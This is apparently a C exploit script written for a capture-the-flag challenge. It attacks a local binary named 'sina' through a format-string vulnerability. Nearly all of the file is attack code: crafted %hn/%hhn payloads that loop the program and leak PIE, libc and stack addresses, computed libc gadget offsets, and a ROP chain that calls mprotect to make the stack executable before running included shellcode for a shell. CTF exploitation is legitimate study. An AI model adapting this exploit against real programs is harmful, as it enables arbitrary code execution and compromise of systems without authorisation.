#define _GNU_SOURCE
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include "shell.h"
#include <sys/select.h>
#include <unistd.h>
#define LOCAL 0


size_t target;
size_t reuse;


char *trash = 0; 
int p;
int fd_send[2];
int fd_recv[2];
int pre= 0;
int res =0;
void panic(char *s){
    puts(s);
    exit(1);
}
void init(){
    if(LOCAL){
        target = 0xed48;
        reuse = 0x63;
    }else{
        target = 0xed48;
        reuse = 0x5a;
    }
}
void loopProgram(){
    puts("[+] Sending first payload to reuse the vulnerability");
    char *buf = malloc(0x40);
    memset(buf,0,0x40);
    int x = reuse-(target&0xff);
    if(x<0)
        x+=0x100;
    snprintf(buf,0x40,"%%c%%c%%c%%c%%c%%c%%c%%c%%c%%c%%c%%c%%c%%c%%%dc%%hn%%%dc%%43$hhn%%%dp|",target-0xe,x,0x10000-0xed63+9);
    do_send(buf);
    free(buf);
}
void doleak(){
    char *buf = malloc(0x40);
    memset(buf,0,0x40);
    snprintf(buf,0x40,"%%%dp%%43$hhn|%%1$p|%%3$p|%%13$p|%%%dc\n",reuse,0x2000-0x94+12);
    do_send(buf);
    free(buf);
}
void do_send(char *buf){
    printf("[+] Sent %d bytes.\n",write(fd_send[1],buf,0x40));
    //It should be okay cuz the other end would only read 0x40
}
void set_target(int idx, int off){
    int val = off + 8*idx + target+8 - reuse;
    char *buf = malloc(0x40);
    memset(buf,0,0x40);
    if(((val+reuse)>>8)==(pre>>8))
        snprintf(buf,0x40,"%%%dp%%43$hhn%%%dp%%30$hhn\n",reuse,(val&0xff));
    else
        snprintf(buf,0x40,"%%%dp%%43$hhn%%%dp%%30$hn\n",reuse,val);
    do_send(buf);
    // read(fd_recv[0],trash,0x10000);
    pre = val+reuse;
}
void set_val(int val,int off){
    char *buf = malloc(0x40);
    memset(buf,0,0x40);
    val = val - reuse;
    if(val<0)
        val+= 0x100;
    if(off==0)
        snprintf(buf,0x40,"%%%dp%%43$hhn%%%dp%%45$ln\n",reuse,val);
    else
        snprintf(buf,0x40,"%%%dp%%43$hhn%%%dp%%45$hhn\n",reuse,val);
    do_send(buf);
    // read(fd_recv[0],trash,0x10000);
}
void loadgadget(int idx,size_t val){
    int vals[6] = {0};
    vals[0] = val & 0xff;
    vals[1] = (val>>8)&0xff;
    vals[2] = (val>>16)&0xff;
    vals[3] = (val>>24)&0xff;
    vals[4] = (val>>32)&0xff;
    vals[5] = (val>>40)&0xff;
    
    for(int i =0 ; i<6;i++){
        if(vals[i]!=0){
            set_target(idx,i);
            set_val(vals[i],i);
        }else{
            if(i==0){
                set_target(idx,i);
                set_val(vals[i],i);
            }
        }
    }
}
void init_target(){
    int val =  target + 8 - reuse;
    char *buf = malloc(0x40);
    memset(buf,0,0x40);
    snprintf(buf,0x40,"%%%dx%%43$hhn%%%dx%%30$hn\n",reuse,val);
    do_send(buf);
    puts("Test if we can init the target");
    read(fd_recv[0],trash,0x2000);
    pre = val+reuse;
}
int do_recv(int fd, char * ptr,size_t size,size_t exepct_ct){
    char *buf = malloc(0x2000) ;
    int i = 0 ; 
    memset(ptr,0,size);
    for(int ct = 0 ; ct<exepct_ct ;ct++){
        memset(buf,0,0x2000);
        int tmp = read(fd,buf,0x2000);
        usleep(100000);
        if(tmp<=0)
            panic("de_recv");
        else
            memcpy(ptr+i,buf,tmp);
        i+=tmp;
        if(tmp<0x2000)
            break;
    }
    if(i >= size)
        puts("[!] The buffer is full, you may need a larger buffer.");
    printf("[+] Read %p byets\n", i);
    return i;
}
int burte_force(){
    pipe(fd_send); // 3 4
    pipe(fd_recv); // 5 6
    int pid = fork();
    if(pid){
        close(fd_send[0]); // Free fd 3
        close(fd_recv[1]); // Free fd 6
        // Maintaining 
        char *buf= malloc(0x40000);
        trash = malloc(0x40000);
        read(0,buf,0x10); // Pause to wait for the debugger
        loopProgram();    // Send the first payload to leak the address and loop the program
        puts("[+] Loop the program");
        read(0,trash,2);
        res = do_recv(fd_recv[0],buf,0x40000,8);
        puts("[+] Retrive the leaked data...");
        doleak();
        res = read(fd_recv[0],buf,0x2000);
        printf("%d\n",res);
        for(int i = 0; i<res;i++)
            if(buf[i]==0)
                buf[i]=0x61;
        puts("\n=============================================");
        for(int i = 0; i<res;i++)
            if(buf[i]==0)
                buf[i]=0x61;
        char *ptr1 = strstr(buf,"|");
        ptr1[0] = 0 ;
        char *ptr2 = strstr(ptr1+1,"|");
        ptr2[0] = 0 ;
        char *ptr3 = strstr(ptr2+1,"|");
        ptr3[0] = 0 ;
        char *ptr4 = strstr(ptr3+1,"|");
        ptr4[0] = 0 ;
        char *ptr5 = strstr(ptr4+1,"|");
        ptr5[0] = 0 ;
        size_t leaked_pie       = strtoll(ptr2+1, NULL, 16);
        size_t leaked_libc      = strtoll(ptr3+1, NULL, 16);
        size_t leaked_stack     = strtoll(ptr4+1, NULL, 16);
        printf("[Leaked Stack] \t\t%p\n",leaked_stack);
        printf("[Leaked Libc] \t\t%p\n",leaked_libc);
        printf("[Leaked pie] \t\t%p\n",leaked_pie);
        puts("\n=============================================");
        
        // remove \x00 in the leaked data so we can use strstr to locate the target

        puts("[+] Init the target");
        init_target();
        
        size_t base,rdi,rsi,rdx,mprotect,gets,rbp,leave,read_addr;
        if(LOCAL){
            base = leaked_libc-(0x7ffff7e96992-0x00007ffff7d82000);
            rdi  = 0x000000000002a3e5+base;
            rsi  = 0x000000000002be51+base;
            rdx  = 0x000000000011f497+base; // pop rdx pop r12
            leave = 0x00000000000562ec+base;
            mprotect = 0x7ffff7ea0c50+base-0x00007ffff7d82000;
            gets = 0x7ffff7e025a0+base-0x00007ffff7d82000;
            rbp = 0x000000000002a2e0+base;
            read_addr = 0x7ffff7e96980-0x7ffff7d82000+base;
        }
        else{            
            base = leaked_libc-(0x7ffff7eb6a22-0x00007ffff7db9000);
            rdi  = 0x000000000002dad2+base;
            rsi  = 0x000000000002f2c1+base;
            rdx  = 0x00000000001073d7+base; // pop rdx pop r12
            rbp  = 0x000000000002da00+base;
            leave = 0x0000000000052f2f+base;
            mprotect = 1076112+base;
            gets = 497392+base;
            read_addr = 1038864+base;
            
        }
        int ct = 0x22;
        loadgadget(0,gets+6);
        char *final = malloc(0x40);
        memset(final,0,0x40);
        snprintf(final,0x40,"%%%dc%%43$hhn\n",0x4);
        do_send(final);
        
        char* x = malloc(0x1000);
        size_t *ptr = x;

        if(LOCAL)
            ct = 0x4f0;
        else
            ct = 0x4c0; 
        ct = ct/8;

        ptr[ct++] = rdi;
        ptr[ct++] = 0;
        ptr[ct++] = rsi;
        ptr[ct++] = (leaked_stack>>12<<12)+0x800-0x1000;
        ptr[ct++] = rdx;
        ptr[ct++] = 0x800;
        ptr[ct++] = 0;
        ptr[ct++] = read_addr;
        ptr[ct++] = rbp;
        ptr[ct++] = (leaked_stack>>12<<12)+0x800-8-0x1000;
        ptr[ct++] = leave;
        x[ct*8] = '\n';
        write(fd_send[1],x,ct*8+1);
            
        char *yyy = malloc(0x1000);
        ptr = yyy;
        ct = 0;
        ptr[ct++] = rdi;
        ptr[ct++] = (leaked_stack>>12<<12)-0x1000;
        ptr[ct++] = rsi;
        ptr[ct++] = 0x1000;
        ptr[ct++] = rdx;
        ptr[ct++] = 7;
        ptr[ct++] = 0;
        ptr[ct++] = mprotect;
        ptr[ct++] = (leaked_stack>>12<<12)+(ct*8+8)-0x800;
        char *xxxz = yyy+ct*8;
        while(ct<0x100)
            ptr[ct++] =rdi+1; 
        memcpy(xxxz,shellphish,sizeof(shellphish));

        read(0,trash,0x10);
        write(fd_send[1],yyy,0x800);
        sleep(3);
    }
    else{
        close(fd_send[1]);
        close(fd_recv[0]);
        dup2(fd_send[0],0);
        dup2(fd_recv[1],1);
        setvbuf(stdin,0,2,0);
        setvbuf(stderr,0,2,0);
        setvbuf(stdout,0,2,0);
        if(LOCAL==1){
            char *new_envp[] = { "xxxxx=xxx", NULL };
            execve("./sina",0,new_envp);
        }
        else{
            // char *new_envp[] = { "LD_PRELOAD=./libc.so.6", NULL };
            char *new_envp[]= {"n132=n132",NULL};
            execve("./sina",0,new_envp);
        }
    }
}
int main() {
    puts("init");
    init();
    burte_force();
}
